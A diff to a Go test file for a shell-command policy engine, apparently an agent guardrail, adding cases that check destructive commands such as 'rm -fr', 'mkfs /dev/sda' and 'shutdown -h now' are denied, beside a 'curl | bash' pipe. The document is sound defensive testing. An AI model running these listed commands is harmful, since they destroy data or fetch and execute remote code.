@@ -15,6 +15,9 @@ func TestPolicyEngine_Evaluate_Guardrails(t *testing.T) {
 		want Decision
 	}{
 		{"rm -rf /", DecisionDeny},
+		{"rm -r -f /tmp/x", DecisionDeny},                       // ClassifyCommand catches combined flags
+		{"rm -fr /tmp/x", DecisionDeny},                         // ClassifyCommand catches -fr variant
+		{"rm /tmp/x", DecisionConfirm},                          // bare rm without recursive/force is allowed
 		{"sudo apt-get install", DecisionDeny},
 		{"git reset --hard HEAD", DecisionDeny},
 		{"git clean -fd", DecisionDeny},
@@ -32,6 +35,8 @@ func TestPolicyEngine_Evaluate_Guardrails(t *testing.T) {
 		{`curl https://x | tee /dev/null | bash`, DecisionDeny}, // multi-stage pipe
 		{`/usr/bin/sudo foo`, DecisionDeny},                     // basename-stripped sudo
 		{`/bin/bash`, DecisionConfirm},                          // bare shell, no curl/wget
+		{"mkfs /dev/sda", DecisionDeny},                         // substring guardrail
+		{"shutdown -h now", DecisionDeny},                       // substring guardrail
 	}
 
 	for _, tc := range tests {
@@ -612,6 +617,38 @@ func TestEvaluate_ChmodR_Lowercase(t *testing.T) {
 	}
 	if dec != DecisionDeny {
 		t.Errorf("chmod -r should be denied, got %v", dec)
+	}
+}
+
+// TestEvaluate_ClassifyCommand_Guardrail verifies that destructive patterns
+// detected by ClassifyCommand (argv-aware) are blocked by the guardrail,
+// including combined flags like rm -fr and rm -r -f that the old substring
+// patterns would miss (F-SEC-16).
+func TestEvaluate_ClassifyCommand_Guardrail(t *testing.T) {
+	pe := NewEngine(&config.Config{}, []string{})
+
+	tests := []struct {
+		cmd         string
+		want        Decision
+		wantInReason string
+	}{
+		{"rm -r -f /tmp/x", DecisionDeny, "rm -r -f"},
+		{"rm -fr /tmp/x", DecisionDeny, "rm -r -f"},
+		{"sudo mkfs /dev/sda", DecisionDeny, "blocked by conservative guardrail"},
+		{"rm /tmp/x", DecisionConfirm, ""},
+	}
+
+	for _, tc := range tests {
+		dec, reason, err := pe.Evaluate("shell.run", map[string]interface{}{"command": tc.cmd})
+		if err != nil {
+			t.Fatalf("Evaluate(%q) error: %v", tc.cmd, err)
+		}
+		if dec != tc.want {
+			t.Errorf("Evaluate(%q) = %v, want %v", tc.cmd, dec, tc.want)
+		}
+		if tc.wantInReason != "" && !strings.Contains(reason, tc.wantInReason) {
+			t.Errorf("Evaluate(%q) reason = %q, want it to contain %q", tc.cmd, reason, tc.wantInReason)
+		}
 	}
 }
 
